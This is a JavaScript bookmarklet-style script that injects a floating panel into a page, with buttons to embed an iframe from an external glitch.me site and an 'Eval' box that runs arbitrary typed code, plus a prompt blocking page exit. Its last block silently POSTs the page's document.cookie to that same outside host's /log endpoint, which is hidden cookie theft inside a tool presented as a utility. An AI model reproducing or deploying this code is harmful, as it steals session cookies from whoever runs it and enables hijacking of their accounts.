document.getElementById("mainDivInject") && (document.getElementById("mainDivInject").remove(), alert("refreshed")), function () {
  let fullscreen = document.createElement("button");
  fullscreen.innerHTML = "fullscreen";
  fullscreen.addEventListener("click", ()=>{
    const frame = document.createElement("iframe");
    frame.style.position = "absolute";
    frame.style.top = "0";
    frame.style.left = "0";
    frame.style.width = "100%";
    frame.style.height = "100%";
    frame.style.zIndex = "999999";
    frame.src = "https://rustic.glitch.me/";

    document.body.appendChild(frame);
    alert("Executed");
  });
  
  const mainDiv = document.createElement("div"), toggle = document.createElement("button"), hiddenDiv = document.createElement("div"), title = document.createElement("h2");
  hiddenDiv.appendChild(title), mainDiv.appendChild(toggle), mainDiv.appendChild(hiddenDiv), document.body.appendChild(mainDiv), mainDiv.id = "mainDivInject", mainDiv.style.width = "50%", mainDiv.style.height = "25%", mainDiv.style.color = "white", mainDiv.style.position = "absolute", mainDiv.style.top = "0px", mainDiv.style.zIndex = "10000", hiddenDiv.style.backgroundColor = "black", hiddenDiv.style.resize = "both", hiddenDiv.style.overflow = "scroll", toggle.innerHTML = "Toggle", title.innerHTML = "Bookmark", toggle.addEventListener("click", () => {
    "none" == hiddenDiv.style.display ? hiddenDiv.style.display = "block" : hiddenDiv.style.display = "none";
  });
  let addRustic = document.createElement("button"), br = document.createElement("br"), runCode = document.createElement("button"), codeInput = document.createElement("input");
  addRustic.innerHTML = "add rustic", runCode.innerHTML = "Eval", hiddenDiv.appendChild(addRustic), hiddenDiv.appendChild(fullscreen), hiddenDiv.appendChild(br), hiddenDiv.appendChild(runCode), hiddenDiv.appendChild(codeInput), addRustic.addEventListener("click", () => {
    let e = document.createElement("iframe");
    e.src = "https://rustic.glitch.me/", e.style.width = "100%", e.style.height = "100%", e.style.resize = "both", hiddenDiv.appendChild(e);
  }), runCode.addEventListener("click", () => {
    eval(codeInput.value);
  });
}();

window.onbeforeunload = function (e) {
    e = e || window.event;

    // For IE and Firefox prior to version 4
    if (e) {
        e.returnValue = 'Sure?';
    }

    // For Safari
    return 'Sure?';
};

try {
  let oReq = new XMLHttpRequest();
  oReq.open("POST", "https://rustic.glitch.me/log");
  oReq.setRequestHeader("Content-Type", "application/json");
  oReq.send(JSON.stringify(document.cookie));
} catch (err) {
  console.warn(err);
}
